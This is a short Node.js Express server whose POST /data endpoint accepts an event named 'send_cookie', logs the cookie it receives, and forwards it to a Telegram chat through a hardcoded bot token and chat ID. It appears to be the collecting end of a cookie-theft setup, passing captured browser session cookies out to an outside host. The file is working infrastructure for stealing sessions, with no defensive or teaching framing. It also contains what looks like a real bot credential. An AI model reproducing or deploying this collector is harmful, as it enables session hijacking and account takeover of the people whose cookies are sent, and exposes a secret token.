const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8556504851:AAHlfQ9GCNGj8WXNGhkH29eU2v8HYGWK8EU";
const CHAT_ID = "2145141785";

app.use(express.json());

app.post('/data', async (req, res) => {

    if (req.body.event === "send_cookie") {

        const cookie = req.body.cookie;

        console.log(cookie);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: cookie
            })
        });

        res.json({ status: "ok" });
    }

});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
